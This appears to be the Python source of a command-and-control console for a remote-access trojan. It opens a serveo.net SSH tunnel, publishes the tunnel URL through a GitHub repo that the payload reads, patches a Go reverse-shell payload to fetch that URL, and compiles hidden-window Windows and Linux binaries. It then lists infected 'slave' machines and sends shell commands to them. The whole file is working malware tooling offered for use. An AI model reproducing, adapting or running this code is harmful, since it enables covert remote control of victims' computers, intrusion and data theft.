try:
    import os
    import sys
    import threading
    from time import sleep

    from git import Repo
    from termcolor import colored
    import json
    import subprocess
    from datetime import date
    import random
    import string
    from shutil import copy2
    from pathlib import Path
except:
    os.system("python3 -m pip install Gitpython")
    os.system("python3 -m pip install termcolor")
    try:
        from git import Repo
        from termcolor import colored
        #from pyngrok import ngrok
    except:
        os.system("pip3 install Gitpython")
        os.system("pip3 install termcolor")
        from git import Repo
        from termcolor import colored
        print("Run me again! :)")
        sys.exit()

repox = ""
urix = ""
comx = ""
def banner(lastupdate):
    banner = f"""
       (
        \\
         )          ##########################################
    ##-------->>>   #version >>> 0.1 (beta)                  #
         )          #last update >>> {lastupdate}              #
        /           #coded by script1337                     #
       (            #github >>> https://github.com/script1337#
    45hw477h4m4 >>> {{A King Above Ace}}
               _.-"/______________________/////
               `'-.\~~~~~~~~~~~~~~~~~~~~~~\\\\\\\\\\"""
    return banner

if os.name == "nt":
    homedir = str(Path.home())
else:
    homedir = str(os.environ['HOME'])

def killx():
    printfc("stopping the server!","red")
    f = open("exit.asw","w+")
    f.close()
    if os.name == "nt":
        pass
    else:
        os.system("killall screen")
        try:
            os.remove("script1337.sh")
        except:
            pass

def linx():
    if os.name == "nt":
        linx = "\\"
    else:
        linx = "/"
    return linx


def checks():
    if os.path.exists(os.getcwd() + linx() + "data"):
        pass
    else:
        os.makedirs("data")

def setup(repo, url):
    if os.path.isdir(repo):
        pass
    else:
        os.remove("config.json")
        printfc("Repo not found!","red")
        killx()
        sys.exit()
    os.system("echo " + url + " > " + "." + linx() + repo + linx() + "urlx.txt")
    repo = Repo('.' + linx() + repo)  # if repo is CWD just do '.'
    repo.index.add(['urlx.txt'])
    repo.index.commit('45hw477h4m4:~# ')
    origin = repo.remote('origin')
    printfc("pushing new url ### ", "magenta")
    try:
        origin.push()
    except:
        printfc("Authentication failed!" ,"red")
        #os.removedirs(str(repo))
        #os.remove("config.json")
        killx()
        sys.exit()


def printfc(text, color):
    if color == "red":
        print(colored(text, 'red'))
    if color == "green":
        print(colored(text, 'green'))
    if color == "yellow":
        print(colored(text, 'yellow'))
    if color == "cyan":
        print(colored(text, 'cyan'))
    if color == "magenta":
        print(colored(text, 'magenta'))


def writex(username, contentx):
    try:
        with open(os.getcwd() + linx() + "data" + linx() + username + linx() + "recv.txt", "w+") as file:
            file.write(contentx)
            file.close()
    except Exception as e:
        if os.path.exists(os.getcwd() + linx() + "data" + linx() + username):
            printfc("Something goes wrong ", "red")
            printfc(e, "red")
        else:
            printfc("Slave " + username + " Not found!", "red")


def read():
    while True:
        try:
            with open("response.txt", "r") as file:
                data = file.read()
                file.close()
                response = data.replace("\n\n","\n")
                res = os.stat("response.txt")
                if res.st_size == 0:
                    os.remove("response.txt")
                elif data.replace(" ","") == "":
                    continue
                elif data.replace("\n","") == "":
                    continue
                else:
                    print("\n")
                    printfc(response, "cyan")
                    sleep(0.5)
                    os.remove("response.txt")
        except:
            pass

def checkbuildingconf():
    global homedir
    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
    winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
    if "go version" in subprocess.check_output(["go", "version"]).decode():
        checkgo = os.path.exists(str(homedir) + linx() + "go")
        if checkgo:
            checksrc = os.path.exists(str(homedir) + linx() + "go" + linx() + "src")
            if checksrc:
                revfile = os.path.isfile(rev)
                winrevfile = os.path.isfile(winrev)
                if revfile and winrevfile:
                    printfc("Everythink looking good","green")
                    return True
                else:
                    copy2("." + linx() + "source" + linx() + "rev.go", homedir + linx() + "go" + linx() + "src" + linx() + "rev")
                    copy2("." + linx() + "source" + linx() + "winrev.go", homedir + linx() + "go" + linx() + "src" + linx() + "rev")
                    return True
            else:
                os.makedirs(str(homedir) + linx() + "go" + linx() + "src")
                return True
        else:
            printfc("Failed to build","red")
            printfc("Go path is not set!","red")
            return False
    else:
        printfc("please install go!","red")
        printfc("Go is not installed!","red")
        return False

def rawtogit(s):
    str1 = ""
    z = 1
    for ele in s:
        if z >= 4:
            str1 += "/" + ele
        else:
            str1 += ele
        z = z + 1
    return str1

def animation():
    global comx
    printfc("Compiling:","cyan")
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        sleep(0.2)
        sys.stdout.write(colored("\r" + animation[i % len(animation)], 'red'))
        sys.stdout.flush()
    if comx != "":
        printfc("\n"+comx,"red")
        sys.exit()

def callanimation():
    the_process = threading.Thread( target=animation)
    the_process.start() 
    return the_process

def writeonrev():
    global repo,homedir
    line_to_replace = 44
    git = repo.replace("https://github.com" , "https://raw.githubusercontent.com").split("/")
    git[1] = "//"
    rawgit =  "http://rawgitsuck.tk/raw?git=" + rawtogit(git) + "/master/urlx.txt"
    text = 	"""\turlx, _ := reciver(string("{rawgit}"))""".format(rawgit=rawgit)
    printfc( "###UrL Resolver set to >>> " + str(rawgit),"green")
    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
    with open(rev, 'r') as file:
        lines = file.readlines()
    if len(lines) > int(line_to_replace):
        lines[line_to_replace] = text + '\n'
    with open(rev, 'w') as file:
        file.writelines(lines)

def builder():
    global comx,homedir
    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
    winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
    if checkbuildingconf():
        writeonrev()
        printfc("###Select os and arch >>> ","green")
        printfc("#1.Windows 64","cyan")
        printfc("#2.Windows 32","cyan")
        printfc("#3.linux 64","cyan")
        printfc("#4.linux 32","cyan")
        print(colored("#app::builder>  ", 'yellow'), end="")
        try:
            options = int(input(""))
        except:
            pass
        if os.name == "nt":
            win = True
        else:
            win = False
        if options == 1:
            printfc("###Start compiling the payload >>> ","yellow")
            com = callanimation()
            if win:
                subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW64.exe "' + winrev, shell=True)
            else:
                os.system("env GOOS=windows GOARCH=amd64 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW64.exe " + winrev)
            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW64.exe")
            com.join()
        elif options == 2:
            printfc("###Start compiling the payload >>> ","yellow")
            com = callanimation()
            if win:
                subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW32.exe "' + winrev, shell=True)
            else:
                os.system("env GOOS=windows GOARCH=386 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW32.exe " + winrev)
            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW32.exe")
            com.join()
        elif options == 3:
            printfc("###Start compiling the payload >>> ","yellow")
            com = callanimation()
            if win:
                subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -o revL64 "' + rev, shell=True)
            else:
                os.system("env GOOS=linux GOARCH=amd64 go build -ldflags \"-s -w\" -o revL64 " + rev)
            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL64")
            com.join()
        elif options == 4:
            printfc("###Start compiling the payload >>> ","yellow")
            com = callanimation()
            if win:
                subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -o revL32 "' + rev, shell=True)
            else:
                os.system("env GOOS=linux GOARCH=386 go build -ldflags \"-s -w\" -o revL32 " + rev)
            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL32")
            com.join()
        else:
            printfc("Please select a valid option","red")
    else:
        pass

def helper():
    help = """
    {{
        ####Configration>>>
        	!command {{ ###run localy os command }}
            app::build {{ ###build payload >>> }}
            app::config {{ ###Change github repo and reconfigure >>> }}
            app::quit {{ ###quit >>> }}
            app::slave {{ ###to see all slave computers >>> }}
        ####remote command>>>
            username::command {{ ###run command on slave computer 
                                 example {{
                                    script::ls -la
                                 }}
                            }}
            
    }}
    """
    printfc(help , "red")

def sendcommand():
    global urix
    while True:
        print(colored("45hw477h4m4:~# ", 'yellow'), end="")
        xenz = input("")
        command = xenz.split("::")
        if xenz == "":
            continue
        elif xenz.startswith("!"):
            os.system(xenz.split("!")[1])
            continue
        if command[0] == "app":
            if command[1] == "slave":
                try:
                    with open(os.getcwd() + linx() + "data" + linx() + "users.txt") as user:
                        printfc("Active slaves >>> ", "cyan")
                        printfc(user.read(), "cyan")
                        user.close()
                except:
                    printfc("No slaves are found!","red")
            elif command[1] == "quit":
                printfc("\ngoodbye", "red")
                killx()
                sys.exit()
            elif command[1] == "build":
                builder()
            elif command[1] == "help":
                helper()
            elif command[1] == "config":
                printfc("removing old config.json", "red")
                try:
                    os.remove("config.json")
                except:
                    pass
                if setconfig():
                    printfc("Config generated successfully!", "green")
                    with open("config.json", "r") as config:
                        confx = json.loads(config.read())
                        repox = confx["repo"]
                        config.close()
                        setup(repox.split("/")[4], urix)
        else:
            try:
                writex(command[0], command[1])
            except:
                printfc("something goes Wrong", "red")
                printfc("{ example >>> \n \tscript::ls -la \n \tapp::quit\n \t!ls -la\n}", "green")


def setconfig():
    global repox
    printfc("Running Setup ### ", "yellow")
    datex = str(date.today())
    printfc("Enter your repo url ###", "yellow")
    repourl = input("# ")
    repo = repourl.split("/")
    try:
        if os.name == "nt":
            subprocess.run('RD /S /Q ' + repo[4],shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            os.system("rm -rf " + repo[4])
        printfc("old repo get removed", "yellow")
    except Exception as e:
        print(e)
    printfc("Trying to Cloning git repo ###", "magenta")
    try:
        Repo.clone_from(repourl, os.getcwd() + linx() + repo[4])
    except Exception as ex:
        e = str(ex)
        if "does not exist" in e:
            printfc("repository does not exist", "red")
            killx()
            sys.exit()
        else:
            printfc(e, "red")
    config = """
{
    "repo": \"""" + repourl + """\",
    "lastupdate": \"""" + datex + """\"
}
"""
    with open("config.json", "w+") as configx:
        configx.write(str(config))
        configx.close()
    repox = repourl
    return True

def randomString(stringLength=32):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def createtunnel():
    global urix
    domain = str(randomString(32))
    urix = "https://" + domain + ".serveousercontent.com"
    if os.name == "nt":
        os.system("start /min ssh -R "+domain+":80:127.0.0.1:5000 serveo.net &")
    else:
        os.system("echo 'ssh -R "+domain+":80:localhost:5000 serveo.net' > script1337.sh")
        os.system("chmod +x script1337.sh")
        os.system("screen -d -m bash script1337.sh")
     
def startserver():
    try:
        os.remove("exit.asw")
    except:
        pass
    if os.name == "nt":
        os.system("start /min python3 server.py &")
    else:
        os.system("nohup python3 server.py >/dev/null 2>&1 &")

if __name__ == '__main__':
    if os.name == "nt":
        os.system('color')
    printfc("Starting the server!","green")
    createtunnel()
    startserver()
    repo = ""
    try:
        try:
            with open("config.json", "r") as config:
                conf = json.loads(config.read())
                #print(conf)
                repo = conf["repo"]
                lastupdate = conf["lastupdate"]
                config.close()
                printfc(banner(lastupdate), "cyan")
                printfc("public_url >>> " + urix,"green")
        except FileNotFoundError:
            printfc(banner(str(date.today())), "cyan")
            if setconfig():
                printfc("Config generated successfully!", "green")
                printfc("public_url >>> " + urix,"green")
        checks()
        try:
            setup(repo.split("/")[4], urix)
        except:
            try:
                setup(repox.split("/")[4], urix)
            except  Exception as e:
                printfc("Run me again!","yellow")
                sys.exit()
        tr = threading.Thread(target=read)
        tr.daemon = True
        tr.start()
        printfc("###run app::help to see all options >>>","magenta")
        sendcommand()
    except KeyboardInterrupt:
        printfc("\ngoodbye", "red")
        killx()
        sys.exit()


